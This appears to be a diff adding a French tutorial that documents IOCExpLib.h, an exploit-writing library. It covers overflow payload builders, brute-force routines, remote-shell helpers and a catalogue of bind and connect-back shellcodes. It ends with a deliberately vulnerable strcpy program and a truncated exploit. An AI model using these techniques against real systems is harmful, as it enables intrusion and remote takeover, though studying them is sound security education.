@@ -1,0 +1,1628 @@
+-------------------------------------------------------------------------------
+    IOCExpLib.h - Présentation (v1.0a BETA)                         Li0n7
+-------------------------------------------------------------------------------
+
+
+
+
+ [ Introduction ] 
+
+ Je déterre ma plume car voila bien longtemps que je n'ai pas écrit de petit
+paper. Avant de commencer, je tiens à mettre les choses au clair, cet article
+et la librairie présentée ici s'adressent à des personnes ayant tout comme moi
+un niveau plus près du débutant que de l'intermédiaire. Ceci étant dit, cet ar-
+-ticle a pour but de présenter de façon concise la librarie IOCExpLib.h, une 
+petite gaterie facilitant la programmation d'exploits types proofs of concept
+exploitant un large pannel de failles. Je tiens à préciser que la librairie n'en
+est qu'à sa première version de la BETA, aussi je vous demanderai d'être
+indulgent quant aux nombreux bugs que vous rencontrerez, de plus, à ce stade du
+developpement il manque malheuresement encore beaucoup de fonctionnalités.
+Enfin, nous commencerons par décrire rapidement la librairie, ses 
+fonctionnalités, son code, et nous donnerons quelques exemples basiques 
+d'utilisation.
+
+
+
+
+
+ [ Sommaire]
+
+
+
+      I - Présentation de la librairie
+             |
+             -> 1) Description (késako)
+             |
+             -> 2) Présentation des fonctionnalités
+             |         |> Les fonctions
+             |         |> Les variables globales et constantes
+             |
+             -> 3) Etude analyptique du code
+
+      II - Exemples d'utilisation
+             |
+             -> 1) Stack-based overflows
+             |
+             -> 2) Heap-based overflows
+             |          |> Écrasement de pointeurs de fonctions
+             |          |> Ecrasement du program counter de la structure jmpbuf
+             |
+             -> 3) Format string exploitation
+             |
+             -> 4) Small-buffer-based overflows
+             |
+             -> 5) Network exploitation
+
+      III - Conclusion 
+             | 
+             -> 1) Le mot de la fin...
+             |
+             -> 2) Tocome
+             |
+             -> 3) Remerciements
+
+      IV - Références
+
+
+
+
+
+
+
+
+
+
+
+
+[ Contenu de l'archive ]
+   
+   
+   IOCExplib.h        -> la librairie en elle même
+   
+   IOCEL_sb.h         -> contient les fonctions relatives à l'exploitation d'un 
+                         stack-based overflow
+   
+   IOCEL_fs.h         -> contient les fonctions relatives à l'exploitation d'un 
+                         heap-based overflow             
+   
+   IOCEL_hb.h         -> contient les fonctions relatives à l'exploitation d'un 
+                         format bugs
+   
+   IOCEL_smallb.h     -> contient les fonctions relatives à l'exploitation de   
+                         petits buffers
+   
+   IOCEL_string.h     -> contient les fonctions de création de notre payload
+   
+   IOCEL_getaddr.h    -> contient les fonctions relative à l'obtention          
+                         d'adresses de sections, fonctions.. liées au format ELF
+   
+   IOCEL_network.h    -> contient les fonctions à l'exploitation distante d'un  
+                         bug
+   
+   IOCEL_misc.h       -> contient des fonctions diverses
+   
+   IOCEL_shellcodes.h -> renferme quelques shellcodes pour les plateformes
+                         linux- freebsd - bsdi - solaris
+
+
+
+
+
+
+
+
+
+
+ I - Présentation de la librairie
+ _________________________________
+
+
+ 1) Description
+
+   Qu'est-ce que renferme cette librairie? Une large gamme de fonctions
+destinée à faciliter la programmation d'exploits, quelles qu'ils soient, pour 
+permettre au hacker d'exploiter rapidement une faille avant l'écriture réèlle 
+du code qu'il va releaser (s'il le release, c'est là un autre problème).
+ 
+
+   Il a été très difficile de concilier exhaustivité et souplesse, ainsi la ver-
+-sion béta de cette librairie n'exploite que des failles type stack-based 
+overflow, heap-based overflows, format bugs et small-buffers based overflow, 
+meme si ce dernier cas de figure n'est pas en lui même un type de faille mais 
+plutôt des conditions dans lesquelles est exploité un bug dans la conception 
+d'un programme.
+
+
+
+ 2) Présentation des fonctionnalités
+
+
+   Une étude objective du code nous permet d'observer que le code de la 
+librairie est découpé en sept parties: quatre parties englobant les fonctions 
+relatives à chaque type de bug exploité par la lib (stack-based, heap-based, 
+format bugs, small-buffers), une partie consacrée à la réalisation du payload 
+ou evil string, la chaine de caractères injectée dans la plage mémoire d'un 
+programme vulnérable, une partie composée des fonctions relatives à une 
+exploitation distante d'un bug (i.e network exploitation), et enfin une ultime 
+partie exposant des fonctions diverses simplifiant l'écriture du code de la 
+librairie(misc functions).
+
+
+   Le plus difficile a été de coder des fonctions les plus souples possible, 
+dans le but de pourvoir une utilisation simple et rapide ne se limitant pas à 
+l'exploitation d'un programme vulnérable type. Bien sûr il est possible 
+d'associer certaines fonctions pour pouvoir exploiter d'autres bugs de 
+conception non traités dans cette version de la librairie.
+
+
+   Ainsi, on trouve pour chacun des quatre types de bug (je rappelle que le 
+small-buffer based, n'est pas un type de bug, mais plutôt un cas de figure, mais
+je le considère comme tel pour faciliter la présentation du code), on trouve au
+moins une fonction construisant le payload à injecter ainsi qu'une fonction 
+bruteforçant certaines variables du payload (des paramètres tels que buffer 
+size, offset, align par exemple).
+
+
+   
+         2.1) Les Fonctions
+
+   La lib IOCExpLib.h renferme grossomodo 35 fonctions, donc voici les déclara-
+-tions (rangées par catégorie, déclarées dans le désordre):
+
+
+   o- Stack-based overflows:
+    
+void IOCExpLib_sb_build(int bsize, int offset, int align, long adress, int 
+var_env, char *shellcode);
+
+int IOCExpLib_sb_bruteforce(int bsize, int offset, long return_adress, char 
+cmd[256], char *shellcode);
+
+
+
+   o- Format bugs exploitation:
+
+
+int IOCExpLib_get_offset(char *progname)
+char* IOCExpLib_fs_build(unsigned int addr, unsigned int value, unsigned int 
+where);
+
+
+
+   o- Heap-based overflows:
+
+
+int IOCExpLib_hb_build(int bsize, int offset, unsigned long addr, char 
+*shellcode, int jmp);
+
+int IOCExpLib_hb_bruteforce(int bsize, int offset, long addr, char cmd[256], 
+char *shellcode, int jmp);
+
+
+
+   o- Small-buffers exploitation:
+
+
+int IOCExpLib_small_buffer(int argc, char **argv, char **environ, int bsize, 
+int align, char *shellcode); 
+
+int IOCExpLib_small_bufferb(int argc, char **argv, char **environ, int bsize, 
+char *shellcode, char cmd[256]);
+
+
+
+   o- Network functions:
+
+
+u_long IOCExpLib_resolve_host(u_char *host_name);
+
+int IOCExpLib_connect(unsigned long victim, int port);
+
+int IOCExpLib_send(int fd, char *buffer);
+
+int IOCExpLib_write(int fd, char *buffer);
+
+int IOCExpLib_read(int fd, char buffer[SIZE_MAX]);
+
+int IOCExpLib_remote_shell(int fd);
+
+void IOCExpLib_close(int fd);
+
+
+
+   o- String making:
+
+
+unsigned long IOCExpLib_get_sp();
+
+long IOCExpLib_return_address(long address, int offset);
+
+char *IOCExpLib_put_nop(char *buff, int size);
+long *IOCExpLib_put_raddress(long *addr_ptr, long address, char *ptr, int size, 
+int align);
+
+char *IOCExpLib_put_shellcode(char *pointer, char *shellcode);
+
+void IOCExpLib_set_env(char *buffer);
+
+
+
+   o- Misc. functions:
+
+
+long IOCExpLib_diff(char *progname, char *section1, char *section2);
+
+int IOCExpLib_tease();
+
+static void IOCExpLib_exec_vuln(void);
+
+int IOCExpLib_split(char cmd[256]);
+
+int IOCExpLib_return_bsize(void);
+
+int IOCExpLib_return_offset(void);
+
+int IOCExpLib_return_align(void);
+
+unsigned long IOCExpLib_return_addr(void);
+
+unsigned int IOCExpLib_get_faddr(char *progname, char *function);
+
+unsigned int IOCExpLib_get_section(char *progname, char *section);
+
+unsigned int IOCExpLib_get_dtors(char *progname);
+
+unsigned int IOCExpLib_get_got(char *progname, char *function);
+
+char *IOCExpLib_return_shellcode(int id);
+
+void IOCExpLib_display_shellcodes(void);
+
+
+   Ainsi, on observe que dans les cas des fonctions des trois premières catégo-
+-rie (stack-based, heap-based, format bugs), leur nom est précédé des initiales
+de l'appellation du bug qu'elles exploitent (sb, hb, fs). 
+
+
+   Les fonctions relatives à l'exploitation de bugs distants, sont classiques,
+connection à un hote distante, lecture/écritute de code sur une socket réseau,
+connection à une backdoor distante avec gestion temps réèl d'un shell, fermeture
+d'une socket ou encore résolution d'un hôte distant.
+
+
+   Quant aux fonctions facilitant la création du code à injecter, elles sont 
+plus ou moins aussi basiques, bien qu'incontournables.
+
+
+   Les fonctions diverses peuvent être regroupées en 4 sous catégories, les fon-
+-ctions utilisées pour le bruteforcing (IOCExpLib_tease(), 
+IOCExpLib_exec_vuln()), les fonctions utilisées pour retourner des paramètres 
+valides, trouvés à la suite d'un bruteforcing (IOCExpLib_return_bsize(), 
+IOCExpLib_return_offset(), IOCExpLib_return_align(), IOCExpLib_return_addr()), 
+les fonctions retournant des addresses de sections de symbols, utilisées dans 
+le cas de format bugs ou de heap-based overflow (pour obtenir l'adresse d'une 
+fonction de la GOT, l'adresse des destructors, ou encore de la section .bss ou 
+.data...)(IOCExpLib_get_faddr(), IOCExpLib_get_section(), IOCExpLib_get_got(), 
+IOCExpLib_get_dtors()), et enfin les fonctions permettant à l'utilisateur de 
+choisir son shellcode ou d'obtenir des informations sur ces derniers 
+(IOCExpLib_return_shellcode(), IOCExpLib_display_shellcodes()).
+
+
+   
+         2.2) Les variables globales et constantes
+
+   La lib IOCExpLib.h utilise bon nombre de variables globales, ce que je 
+regrette un peu, le code en est moins soigné, mais d'un autre côté, ceci a 
+grandement facilité l'écriture des fonctions en diminuant le nombre de 
+paramètres nécéssaires dans leurs prototypes (déjà conséquents pour la plupart 
+je vous l'accorde).
+
+   Voici les variables globales:
+
+    int IOCExpLib_myargc;
+
+    Cette variable sert à stocker le nombre d'arguments nécéssaires à 
+l'exploitation du programme vulnérables (exemple: pour un programme à exploiter 
+du type:
+"./vuln -f file.txt -g 10 -o user -e <breakme>", IOCExpLib_myargc aura pour va-
+-leur 9).
+
+    int IOCExpLib_bsize, IOCExpLib_offset, IOCExpLib_align;
+    unsigned long IOCExpLib_addr;
+
+    Ces variables sont remplies respectivement par la taille du buffer, l'offset
+et l'alignement trouvés à la suite d'un bruteforcing, sur le programme 
+vulnérable, réussi. Notez qu'on peut directement les utiliser dans un code ou 
+les récupérer par le biais des fonctions 
+IOCExpLib_return_bsize();|offset();|align();|addr();
+
+    char *IOCExpLib_name, *IOCExpLib_payload, *IOCExpLib_myargv[64];
+    
+    Ces variables sont extrémement importantes puisqu'elles sont indispensables
+à la fonction IOCExpLib_exec_vuln() qui éxécute le programme vulnérable avec les
+arguments entrés par l'utilisateur (nécéssaire pour les fonctions de 
+bruteforcing par exemple). Ainsi, IOCExpLib_name contient le nom du fichier, 
+IOCExpLib_payload la chaine de caractère diabolique exploitant une 
+vulnérabilité, et enfin IOCExpLib_myargv[64] est un tableau contenant tous les 
+arguments à utiliser avec le programme vulnérable. Toutes ces variables sont 
+retournées par la fonction
+IOCExpLib_split();
+ (exemple: avec un programme type à exploiter de la sorte: 
+"./vuln -s user -f fichier.txt -d <breakme>" et, Le code suivant:
+
+-----------------------------------
+     int i;
+     char cmd[] = "./vuln -s user -f fichier.txt -d <breakme>";
+     IOCExpLib_split(cmd);
+     
+     fprintf(stdout, "Le nom du programme est %s, il y a %i arguments\n", 
+IOCExpLib_name, IOCExpLib_myargc);
+
+     for(i= 0; i <= IOCExpLib_myargc; ++i)
+          if(IOCExpLib_myargv[i] != 0){
+              fprintf(stdout, "IOCExpLib_myargv[%i] = %s\n", i, 
+IOCExpLib_myargv[i]);
+          }
+----------------------------------
+
+   Vous devriez obtenir quelque chose comme ceci:
+       Le nom du programme est vuln, il y a 7 arguments 
+       IOCExpLib_myargv[0] = ./vuln
+       IOCExpLib_myargv[1] = -s
+       IOCExpLib_myargv[2] = user
+       IOCExpLib_myargv[3] = -f
+       IOCExpLib_myargv[4] = fichier.txt
+       IOCExpLib_myargv[5] = -d
+       IOCExpLib_myargv[6] = <breakme>
+
+   Notez que la chaine de caractère <breakme> entrée en dernier argument dans
+ce cas là, sera ensuite remplacée par notre evil string. Nous étudierons ça plus
+tard.
+
+
+    extern char **environ;
+
+    Enfin, cette ultime variable contient l'environnement dans lequel est lancé 
+le programme.
+
+
+   Passons ensuite aux constantes, elles sont bateaux comme à l'habitude.
+
+
+    #define VERBOSE
+
+    La constante VERBOSE (mode bavard) est à utiliser avec attention, il n'y a 
+pour le moment, qu'un seul niveau de "bavardage", ainsi, cette constante 
+déclarée, le programme sera extrémement "bavard", et décrira en détail 
+l'avancée de l'exploitation du bug. Dans le cas contraire, il sera plus que 
+silencieux.
+
+    #define VERSION                                    "IOCExpLib V1.0a BETA by 
+IOC"
+
+    Comme je l'ai dit précédemment, la version actuelle de la librairie n'en est
+qu'à sa première bétà, aussi je vous demande d'être exigeant quant aux bugs
+que vous pourriez rencontrer.
+
+    #define DEFAULT_OFFSET                     0 
+
+    L'offset à partir duquel le bruteforcing commence.
+
+    #define DEFAULT_BUFFER_SIZE             600
+
+    La taille du buffer à exploiter dans le cadre d'un bruteforcing, si aucune
+taille n'est spécifiée, alors on utilise celle là.
+
+    #define DEFAULT_ALIGN                        0
+
+    L'alignement en mémoire par défaut.
+
+    #define NOP                                           0x90
+
+    Nop suxx? (x86)
+
+    #define OFFSET_MAX                            -1000
+
+    L'offset à partir duquel le bruteforcing stoppera.
+
+    #define EGG                                           "EGG="
+
+   Dans le cas d'un stack-based overflow par exemple, on peut spéficier si oui
+ou non on désire utiliser une variable d'environnement pour stocker notre 
+payload dans ce cas là, la variable d'environnement aura pour nom $EGG.
+
+    #define SIZE_MAX                                           1024
+     
+    Utilisé dans la fonction réseau IOCExpLib_read() pour spécifier la longueur
+des données à lire.
+
+
+
+ 3) Étude analyptique du code
+
+   Attention: le code actuel est en mesure d'évoluer, la version actuelle de la 
+lib étant une simple bétà release. Aussi je ne présenterai que les fonctions 
+susceptibles de ne PAS subir de modifications.
+
+
+    Nous étudierons dans cette partie, l'ensemble des fonctions proposées par la
+librairie, en commençant par les plus simples.
+
+
+
+   o- String making:
+
+
+unsigned long IOCExpLib_get_sp();
+
+    Cette fonction permet d'obtenir l'adresse du registre courant esp (stack 
+pointer), pointant sur le sommet de la pile, le but étant de deviner le 
+décalage existant entre le le sommet de la pile et l'adresse de notre
+shellcode, nous soustrairons plus tard un offset pour essayer d'obtenir une 
+adresse pointant sur des NOPs de notre shellcode, placé dans le buffer 
+vulnérable. Ainsi l'adresse du sommet de la pile est retournée.
+
+
+long IOCExpLib_return_address(long address, int offset);
+
+    Cette fonction soustrait un offset à l'adresse du registre esp, pour tenter 
+d'obtenir une adresse valide pointant sur les NOPs précédant notre shellcode.
+L'adresse du registre esp (long address) ainsi que l'offset à soustraire (int
+offset), sont entrés en argument, tandis qu'une adresse hypothétique type long 
+est retournée.
+
+
+char *IOCExpLib_put_nop(char *buff, int size);
+
+    Cette fonction est plus que basique, elle remplie un buffer de size NOP. 
+Elle prend en argument le buffer à remplir (char *buff), le nombre de NOPs à y 
+placer (int size), et retourne le buffer alors rempli.
+
+
+long *IOCExpLib_put_raddress(long *addr_ptr, long address, char *ptr, int size, 
+int align);
+
+    Cette fonction permet de placer une adresse de retour dans un buffer, on 
+prend en compte un alignement en mémoire compris entre 0 et 3.
+
+
+char *IOCExpLib_put_shellcode(char *pointer, char *shellcode);
+
+    Cette fonction place le shellcode dans un buffer, tous deux entrés en argum-
+-ents et retourne le buffer modifié.
+
+
+void IOCExpLib_set_env(char *buffer);
+
+   Enfin, cette ultime fonction permet de placer dans une variable 
+d'environnement, une chaine de caractère, contenant notre payload, entrée en 
+argument.
+   
+
+
+   o- Misc. functions:
+
+
+long IOCExpLib_diff(char *progname, char *section1, char *section2);
+
+    Cette fonction peut être utilisé dans le cas d'un heap overflow par 
+écrasement de l'adresse du destructor (section .DTORS). On entre en argument le 
+nom du programme à partir pour lequel nous récupèrerons les adresses des deux 
+sections dont les noms sont entrés en argument (char *section1, *section2), et 
+cette fonction s'occupe de soustraire l'adresse de la section2 à celle de la 
+section1 et retourne le résultat. 
+
+
+int IOCExpLib_tease();
+
+    Cette fonction est utilisée pour tous les types de bruteforcing. Elle permet
+de tester si oui ou non notre payload nous a lancé un shell sur le programme
+vulnérable. Son fonctionnement est simple, on fork() pour dupliquer le processus
+courant, ensuite on éxécute dans le processus enfant le programme vulnérable 
+avec un payload, puis, on attend que le processus enfant se termine via
+wait(&status). On analyse ensuite la sortie de l'enfant, si le processus enfant 
+s'est terminé normalement, alors il y a de fortes chances pour que notre payload
+soit valide, on utilise pour cela les maccros déclarées dans sys/wait.h:
+WEXITSTATUS(status), WIFSIGNALED(status), WTERSIG(status), WCOREDUMP(status).
+Cette fonction retourne le numéro correspondant à l'état du status du processus 
+enfant (0 si le programme s'est éxécuté sans erreur).
+
+
+static void IOCExpLib_exec_vuln(void);
+
+    Cette fonction lance notre programme vulnérable. Aucun paramètre n'est à
+spécifié, puisque nous avons vu précédemment que cette fonction utilise les var-
+-iables globales IOCExpLib_myargc, IOCExpLib_myargv[64], IOCExpLib_name pour
+obtenir les paramètres nécéssaires à l'éxécution du programme vulnérable.
+
+
+int IOCExpLib_split(char cmd[256]);
+
+    Nous avons déjà étudié cette fonction précédemment, elle permet de séparer
+les différents arguments contenus dans la chaine de caractère cmd[256] entrée 
+en  paramère pour les placer dans le tableau IOCExpLib_myargv[64]. Notons que si
+la variable globale IOCExpLib_payload n'est pas NULL alors l'argument correspon-
+-dant à la chaine de caractère "<breakme>" dans IOCExpLib_myargv[64] est 
+remplacé par le payload.
+    Ainsi si vous avez le programme vulnérable suivant "./vuln -n nom -p prenom 
+-a age"
+et que vous souhaitez overflooder la variable prenom, vous entrerez comme cmd:
+"./vuln -n nom -p <breakme> -a age", ce qui aura pour conséquence d'éxécuter 
+vuln avec à la place du prénom, votre payload.
+
+
+int IOCExpLib_return_bsize(void);
+int IOCExpLib_return_offset(void);
+int IOCExpLib_return_align(void);
+unsigned long IOCExpLib_return_addr(void);
+
+    Ces quatre fonctions retournent les paramètres suivant: taille du buffer 
+(buffer size), offset, align et return address (addresse de retour de notre 
+shellcode), paramètres valides. Les valeurs retournées par ses fonctions sont 
+respectivement stockées dans les variables globales IOCExpLib_bsize, 
+IOCExpLib_offset, IOCExpLib_align, IOCExpLib_addr. Vous pouvez donc directement 
+les récupérer par le biais de ces variables. Ces variables sont remplies par 
+les valeurs retournées à la suite d'un bruteforcing réussi.
+
+
+unsigned int IOCExpLib_get_faddr(char *progname, char *function);
+unsigned int IOCExpLib_get_section(char *progname, char *section);
+unsigned int IOCExpLib_get_dtors(char *progname);
+unsigned int IOCExpLib_get_got(char *progname, char *function);
+ 
+    Ces fonctions permettent de retourner l'adresse d'une section ou d'une fon-
+-ction située dans une section quelconque d'un éxécutable au format ELF.
+Notez que la fonction IOCExpLib_get_section() peut se substuer à toutes les 
+autres fonctions, puisqu'elle permet de retourner l'adresse de n'importe quelle 
+section. Remarquons aussi que l'adresse retournée par la fonction 
+IOCExpLib_get_dtors() est incrémentée de 4 pour directement donner l'adresse du 
+tag head à écraser.
+  
+
+char *IOCExpLib_return_shellcode(int id);
+
+    Cette fonction retourne un shellcode correspondant à l'identifiant id entré
+en paramètre. Pour le moment seulement 16 shellcodes sont disponibles,
+pour obtenir leurs numéros, se réfèrer à la fonction suivante.
+
+
+void IOCExpLib_display_shellcodes(void);
+
+    Cette fonction affiche l'ensemble des shellcodes disponibles pour le moment,
+en voici la liste:
+        [x] Here are all the shellcodes available (IOCExpLib V1.0a BETA by IOC)
+ 
+        ID   NAME           FUNCTION  LENGHT
+        [1] linux_long_sh: LINUX runs /bin/sh, (45) - ?
+        [2] linux_short_sh: LINUX runs /bin/sh, very short shellcode (24) - ?
+        [3] linux_bind_shell: LINUX binds a shell on port 5555 (89) - by 
+Emper0r@ioc.fr.st
+        [4] linux_bind_chroot: LINUX setuid(0) + chroot() break remote 
+shellcode (122) - by sd@cdi.cz
+        [5] linux_connect_back: LINUX minimalistic "69" remote shellcode 
+(connect-back) (ntbe) (16) - by sd@cdi.cz
+        [6] linux_setuid_sh: LINUX setuid(0) + execve() /bin/sh (28) - by 
+sd@cdi.cz
+        [7] linux_setuid_chroot_sh: LINUX setuid(0) + chroot break + execve() 
+(61) - by sd@cdi.cz
+ 
+        [8] fbsd_shell_binder: FreeBSD shellcode that binds /bin/sh to port 
+41254 (115) - by zillion (safemode.org)
+        [9] fbsd_connect_back: FreeBSD Connecting back shellcode (ntbe) (97) - 
+by zillion (safemode.org)
+        [10] fbsd_long_sh: FreeBSD execve() /bin/sh (29) - by zillion 
+(safemode.org)
+        [11] fbsd_poly_bind: FreeBSD shellcode that will bind /bin/sh to port 
+43690 (138) - by zillion (safemode.org)
+ 
+        [12] bsd_setuid_sh: BSD setuid(0,0); execve /bin/sh; exit(); (38) - by 
+eSDee of Netric (www.netric.org)
+        [13] bsd_shell_binder: BSD binds a shell on port 5555 (very short 
+shellcode) (72) - by emper0r@ioc.fr.st
+        [14] bsd_connect_back: BSD connect back shellcode (port=0xb0ef) (ntbe) 
+(124) - by eSDee of Netric (www.netric.org)
+ 
+        [15] solaris_setuid_sh: SOLARIS setuid(0,0); execve /bin/sh; (40) - by 
+bighawk@kryptology.org
+        [16] solaris_shell_binder: SOLARIS binds /bin/sh on port 10000 (92) - 
+by bighawk@kryptology.org
+ 
+         *'ntbe': Need To Be Edited (edit IP address to connect back to for 
+instance)
+    
+   Les informations renvoyées sur les shellcodes par la commande
+IOCExpLib_display_shellcode() sont imprimées selon le format suivant:
+[IDENTIFIFANT SHELLCODE- NOM SHELLCODE - DESCRIPTION - TAILLE - AUTEUR] 
+
+
+   o- Network functions:
+
+
+u_long IOCExpLib_resolve_host(u_char *host_name);
+
+    Cette fonction permet la résolution d'un nom d'hôte distant. Le nom est 
+entré en argument, tandis que son adresse est retournée.
+
+
+int IOCExpLib_connect(unsigned long victim, int port);
+
+    Cette fonction permet la communication de deux sockets réseaux. Elle 
+commence par construire notre socket réseaux puis tente ensuite de se connecter 
+par le biais des informations entrées en arguments (l'adresse de la victime, le 
+port sur lequel se connecter). Si la connection a échoué, alors elle retourne   
+-1.
+
+
+int IOCExpLib_send(int fd, char *buffer);
+
+    Cette fonction envoie les données entrées en argument sur la socket réseau 
+fd. Si le buffer est NULL ou si l'envoie a échoué, alors la fonction retourne 
+-1.
+
+
+int IOCExpLib_write(int fd, char *buffer);
+int IOCExpLib_read(int fd, char buffer[SIZE_MAX]);
+
+    Ces deux fonctions permettent de recevoir et émettre des données sur une 
+socket réseau entrée en argument.
+
+
+int IOCExpLib_remote_shell(int fd);
+
+    Cette fonction a été récupérée à partir de l'article de OUAH sur les buffer
+overflows (voir références en fin d'article). Cette fonction est utilisée après 
+avoir envoyé notre payload sur le serveur distant présentant un binaire 
+vulnérable. Si l'exploit a fonctionné, alors le port 5555 (dans le cas du 
+shellcode d'Emper0r) est ouvert et en attente de connection. On se connecte 
+alors à se port via IOCExpLib_connect() par exemple puis on envoie une commande 
+quelconque telle que "id;uname -a" par exemple. C'est là que notre fonction 
+entre en jeu.
+
+    Elle se base sur le principe du multiplexage d'entrées, on endort le proces-
+-sus après avoir communiquer au noyau la liste des descripteurs qui nous 
+intérèssent. Si on reçoit des données sur une socket réseau alors on réveille 
+le processus, on affiche les données reçues, puis enfin on demande à 
+l'utilisateur d'entrer une commande, puis on re-endort le processus, et on 
+recommence. C'est le principe du shell interactif.
+
+
+void IOCExpLib_close(int fd);
+
+    Cette fonction ferme une socket réseau, et retourne le code de retour de 
+close().
+
+
+   o- Stack-based overflows:
+    
+
+void IOCExpLib_sb_build(int bsize, int offset, int align, long adress, int 
+var_env, char *shellcode);
+
+    Fonction mère de toute exploitation de stack-based overflows, elle permet de
+construire notre chaine diabolique ("evil string"). Elle prend en argument la
+taille du buffer à exploiter (bsize), le décalage entre le sommet de la pile et
+notre shellcode (offset), et enfin le shellcode à utiliser. La variable var_env 
+permet de spécifier si oui ou non on désire utiliser une variable 
+d'environnement, 1 pour en utiliser une, 0 sinon. Notez que l'on peut aussi 
+spécifier une adresse de retour à utiliser (long adress), dans le cas contraire 
+l'adresse de retour est calculée en effectuant la somme:
+      address = IOCExpLib_get_sp() - offset;
+Le payload a donc cette forme: [NOPNOP(...)NOP][SHELLCODE][RET_ADDR(...)].
+
+
+int IOCExpLib_sb_bruteforce(int bsize, int offset, long return_adress, char 
+cmd[256], char *shellcode);
+
+    Cette fonction permet de bruteforcer la taille du buffer à exploiter, 
+l'offset ainsi que l'alignement en mémoire. On entre en paramètre la taille du 
+buffer ainsi que l'offset à partir desquels commencer à bruteforcer. On peut là 
+aussi spécifier directement une adresse de retour à partir de laquelle on 
+bruteforce. On entre enfin la commande renfermant le programme vulnérable à 
+éxécuter ainsi que le shellcode à utiliser.
+    Notez que cette fonction décrémente buffer size et offset de 100, pour 
+chaque couple buffer-size/offset on lance le programme vulnérable en essayant 
+successivement les alignements 0, 1, 2 et 3. Enfin, il est fortement 
+recommander d'entrer une taille pour le buffer, largement plus grande que celle 
+du buffer vulnérable. Dans le cas contraire, le bruteforcing échouerait.    
+
+
+   o- Heap-based overflows:
+
+
+int IOCExpLib_hb_build(int bsize, int offset, unsigned long addr, char 
+*shellcode, int jmp);
+
+    Par analogie à la foncton IOCExpLib_sb_build(), cette fonction construit le
+payload utilisé dans l'exploitation de buffer overflows ayant lieu dans le heap
+(tas) et non dans la stack (pile). On fournit dans ce cas de figure là, 
+l'adresse de la section contenant notre buffer overfloodable (dans un programme 
+compilé en static, la section .bss), la taille du buffer exploitable, l'offset 
+et le shellcode. Comment la chaine est-elle construite? On commence par remplir 
+le buffer par des instructions NOP jusqu'à une adresse située dans le buffer à:
+(bsize - strlen(shellcode), on place ensuite notre shellcode, et enfin on 
+déborde sur l'entitée située à côté de notre buffer dans le heap (de préférence 
+un pointeur de fonction) en écrasant son adresse par notre adresse de retour 
+calculée de la façon suivante: addr + offset (ou addr représente l'adresse du 
+début de notre section .bss, tandis que offset la moitié environ de la section 
+.bss).
+    La variable jmp permet de spécifier si oui ou non on désire exploiter une
+faille de type longjmp(), si oui, alors notre payload est construit 
+différemment. On écrase pour cela l'adresse du champs jmpbuf->pc (program 
+counter), correspondant à la sauvegarde du registre eip (l'instruction 
+pointer), par l'adresse de retour de notre shellcode.
+
+int IOCExpLib_hb_bruteforce(int bsize, int offset, long addr, char cmd[256], 
+char *shellcode, int jmp);
+
+    Cette fonction permet de bruteforcer le décalage relatif entre le début de 
+notre section .bss et le début de notre shellcode, en décrémentant cet offset de
+10 jusqu'à atteindre 0. Les valeurs retournées sont l'offset et l'adresse de
+retour utilisés dans le cas ou le bruteforce aurait réussi.
+
+
+   o- Small-buffers exploitation:
+
+
+int IOCExpLib_small_buffer(int argc, char **argv, char **environ, int bsize, 
+int align, char *shellcode); 
+
+    Cette fonction construit le payload dans le cadre de l'exploitation d'un
+petit buffer. Je vous renvoie à l'article de Seb-Sb (voir référence en fin
+d'article). Cette technique est utilisée dans le cas ou vous devez exploiter un
+buffer trop petit pour contenir votre shellcode. Le principe est simple, on ré-
+-cupère l'adresse de notre shellcode que l'on stocke alors dans le dernier 
+argument entré en paramère du programme (ex: ."/vuln -s <notreshellcode>"), 
+puis on  écrase l'adresse de l'eip sauvegardé par l'adresse exacte de notre 
+shellcode (calculée ainsi:) 
+
+----------------------------------
+      (char *) retaddr = argv[argc-1] + strlen(argv[argc-1]);
+      retaddr -= strlen(shellcode);
+      retaddr += align;
+----------------------------------
+
+    On commence par se placer à l'adresse du dernier argument, ensuite on 
+soustrait à sa addresse la taille de notre shellcode, on obtient alors 
+l'adresse exacte de notre shellcode. On ajoute ensuite à cette adresse un 
+alignement quelconque (variant selon les machines).
+    Notez que l'on transmet à notre fonction le nombre d'arguments (argc), les
+arguments eux-mêmes (argv), notre environnement, la taille du buffer, 
+l'alignement souhaité, ainsi que le shellcode à utiliser.
+
+int IOCExpLib_small_bufferb(int argc, char **argv, char **environ, int bsize, 
+char *shellcode, char cmd[256]);
+
+    Cette fonction permet de bruteforcer l'alignement en mémoire (0,1,2,3). Même
+prototype que la fonction précédente, à la différence que l'on fournit en 
+paramètre la ligne de commande correspondant à l'éxécution du programme 
+vulnérable.
+
+
+   o- Format bugs exploitation:
+
+
+char* IOCExpLib_fs_build(unsigned int addr, unsigned int value, unsigned int 
+where);
+  
+    Attention: cette fonction est directement issue de l'article sur les débord-
+-ements de tampon par C. Blaess, C. Grenier et F. Raynal (voir référence en fin
+d'article).
+    Cette fonction permet de créer un payload dans le cadre de l'exploitation
+d'un format bug par direct reference. Je vous redirige vers cet article d'une 
+très grande facture pour mieux saisir le fonctionnement des format bugs, un peu
+plus complexes que des heap/stack-based overflows, et la présentation de tels
+bugs dépasse le cadre de cette article. 
+   Notez que pour le moment je n'ai pas touché à cette fonction (manque de 
+temps, cette article sort déjà avec une semaine de retard, tandis que la bétà 
+de la lib vient juste de commencer), mais il faut que le programme vulnérable 
+ait la même taille que l'exploit, je vous laisse recoder la fonction pour 
+bypasser cette restriction. La prochaine version de la lib sera patchée de 
+toute façon.
+
+int IOCExpLib_get_offset(char *progname);
+
+    Cette fonction permet de calculer l'offset, ou plutôt le nombre de eats né-
+-céssaires pour se placer au début du buffer vulnérable.
+
+
+
+ II - Exemples d'utilisation
+ _____________________________
+
+
+   Nous étudierons à travers cette partie différents cas de figure basiques, 
+dans lesquels notre librairie nous sera utile. Dans chacun des cas, nous 
+étudierons deux exploits, l'exploit simple sans bruteforcing, et l'exploit avec 
+bruteforcing.
+
+
+ 1) Stack-based overflow
+
+   Voici le programme vulnérable (le buffer vulnérable a volontairement une
+taille importante):
+
+---------vuln1.c------------------
+
+ #include <string.h>
+int main(int argc, char * argv [])
+  {
+    char buffer [1000];
+
+    if (argc > 1)
+    strcpy(buffer, argv[1]); // here's the flaw
+    return (0);
+  }
+
+----------------------------------
+
+   Nous nous trouvons dans le cas du stack-base overflow classique:
+
+  
+---------exp_sb_nobf.c------------
+
+#include <stdio.h>
+#include "../IOCExpLib.h"
+
+#define CMD "vuln1 <breakme>\n"
+#define RET 0xbffff5a8
+
+int
+main(int argc,char *argv[]) {
+
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE, align=0;
+  int res;
+  char shellcode[512];
+
+   if (argc > 1) bsize  = atoi(argv[1]);
